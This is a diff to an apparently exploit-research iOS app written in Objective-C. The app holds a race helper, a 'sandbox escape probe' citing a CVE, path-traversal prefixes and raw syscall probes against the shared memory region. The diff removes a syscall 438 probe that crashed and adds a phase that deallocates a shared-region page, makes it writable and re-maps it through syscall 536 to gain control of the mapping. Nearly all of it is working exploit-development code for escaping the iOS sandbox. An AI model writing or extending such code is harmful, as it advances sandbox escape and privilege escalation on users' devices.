@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie SBX spawn (v232)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v233)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v232: writable SR pages + syscall 438/437/535 probe ===\n"];
+        [self appendLog:@"\n=== Rie v233: fix crash + SR deallocate/re-map probe ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9704,50 +9704,11 @@ static uint64_t rie_find_exec_base(task_t task,
                     [self appendLog:@"  no writable SR pages found"];
                 }
 
-                // ── Also probe syscall 438 (v1 shared_region_map_and_slide_np) ──
-                [self appendLog:@"\n── syscall 438 (v1) probe ──"];
-                errno = 0;
-                long r438_0 = sc(438, 0, NULL, 0, NULL);
-                [self appendLog:[NSString stringWithFormat:
-                    @"  438(0,NULL,0,NULL): ret=%ld errno=%d", r438_0, errno]];
-
-                if (r438_0 == 0 || errno != 0) {
-                    // syscall 438 exists, try with params
-                    struct rie_sr_file tf438;
-                    struct rie_sr_mapping tm438;
-                    memset(&tf438, 0, sizeof(tf438));
-                    memset(&tm438, 0, sizeof(tm438));
-                    tf438.sf_fd = -1; tf438.sf_mappings_count = 0;
-                    errno = 0;
-                    long r438_1 = sc(438, 1, &tf438, 0, NULL);
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  438(1file,0maps): ret=%ld errno=%d", r438_1, errno]];
-
-                    tf438.sf_mappings_count = 1;
-                    tm438.sms_address = 0x180000000ULL; // within SR
-                    tm438.sms_size = 0x4000;
-                    tm438.sms_max_prot = 5; tm438.sms_init_prot = 3;
-                    tm438.sms_file_offset = 0;
-                    tm438.sms_slide_size = 0; tm438.sms_slide_start = 0;
-                    errno = 0;
-                    long r438_2 = sc(438, 1, &tf438, 1, &tm438);
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  438(1file,1map SR base): ret=%ld errno=%d", r438_2, errno]];
-
-                    // Also try at a high address
-                    tm438.sms_address = 0x1f0000000ULL;
-                    errno = 0;
-                    long r438_3 = sc(438, 1, &tf438, 1, &tm438);
-                    [self appendLog:[NSString stringWithFormat:
-                        @"  438(1file,1map @0x1f0000000): ret=%ld errno=%d", r438_3, errno]];
-                }
-
-                // ── syscall 437/438/535 probes (SR v1 variants) ──
+                // ── syscall 437/535 probes (skip 438 — caused crash in v232) ──
                 [self appendLog:@"\n── Other SR syscall probes ──"];
-                // 437 = shared_region_map_and_slide_np (v1, deprecated)
-                // 438 = unknown, but in SR range — check if it exists
-                int testSCs[] = {437, 438, 535};
-                for (int ti = 0; ti < 3; ti++) {
+                int testSCs[] = {437, 535};
+                const char *testSCnames[] = {"437", "535"};
+                for (int ti = 0; ti < 2; ti++) {
                     int sn = testSCs[ti];
                     errno = 0;
                     long r = sc(sn, 0, NULL, 0, NULL);
@@ -9761,6 +9722,68 @@ static uint64_t rie_find_exec_base(task_t task,
                             sn, r, errno]];
                     }
                 }
+            }
+        }
+
+        // ── Phase D-5: deallocate SR page → re-map → become first-mapper? ──
+        [self appendLog:@"\n── Phase D-5: SR deallocate + re-map probe ──"];
+        {
+            // Resolve mach_vm_deallocate and mach_vm_protect
+            kern_return_t (*vm_dealloc)(vm_map_t, mach_vm_address_t, mach_vm_size_t) =
+                dlsym(RTLD_DEFAULT, "mach_vm_deallocate");
+            kern_return_t (*vm_prot)(vm_map_t, mach_vm_address_t, mach_vm_size_t, boolean_t, vm_prot_t) =
+                dlsym(RTLD_DEFAULT, "mach_vm_protect");
+            // Resolve vm_region for address validation
+            Rie_VMRegionRecurseFn vrr5 = (Rie_VMRegionRecurseFn)dlsym(RTLD_DEFAULT, "mach_vm_region_recurse");
+
+            if (vm_dealloc) {
+                [self appendLog:[NSString stringWithFormat:@"  mach_vm_deallocate=%p", vm_dealloc]];
+                // Pick a test address: SR base + 0x100000 (well past the TEXT header, 1MB in)
+                // This is inside the first dyld region's writable area
+                mach_vm_address_t testAddr = 0x180100000ULL;
+                mach_vm_size_t testSize = 0x4000; // one page
+
+                // Test A: try to deallocate one page from the SR
+                errno = 0;
+                kern_return_t krA = vm_dealloc(mach_task_self(), testAddr, testSize);
+                [self appendLog:[NSString stringWithFormat:
+                    @"  A: dealloc SR page @0x%llx → kr=%d errno=%d",
+                    (unsigned long long)testAddr, krA, errno]];
+
+                // Test B: try to change protection (R→RW)
+                if (vm_prot) {
+                    errno = 0;
+                    kern_return_t krB = vm_prot(mach_task_self(), testAddr, testSize, FALSE,
+                        VM_PROT_READ | VM_PROT_WRITE);
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  B: protect RW @0x%llx → kr=%d errno=%d",
+                        (unsigned long long)testAddr, krB, errno]];
+                }
+
+                // If dealloc succeeded, try to re-map via syscall 536
+                if (krA == KERN_SUCCESS) {
+                    [self appendLog:@"  dealloc OK! Attempting re-map via nf=1,fd=-1..."];
+                    struct rie_sr_file tf5;
+                    struct rie_sr_mapping tm5;
+                    memset(&tf5, 0, sizeof(tf5));
+                    memset(&tm5, 0, sizeof(tm5));
+                    tf5.sf_fd = -1;
+                    tf5.sf_mappings_count = 1;
+                    tf5.sf_slide = 0;
+                    tm5.sms_address = testAddr;
+                    tm5.sms_size = testSize;
+                    tm5.sms_max_prot = 5;
+                    tm5.sms_init_prot = 3;
+                    tm5.sms_file_offset = 0;
+                    tm5.sms_slide_size = 0;
+                    tm5.sms_slide_start = 0;
+                    errno = 0;
+                    long r5 = sc(536, 1, &tf5, 1, &tm5);
+                    [self appendLog:[NSString stringWithFormat:
+                        @"  C: re-map after dealloc → ret=%ld errno=%d", r5, errno]];
+                }
+            } else {
+                [self appendLog:@"  mach_vm_deallocate not available"];
             }
         }
 
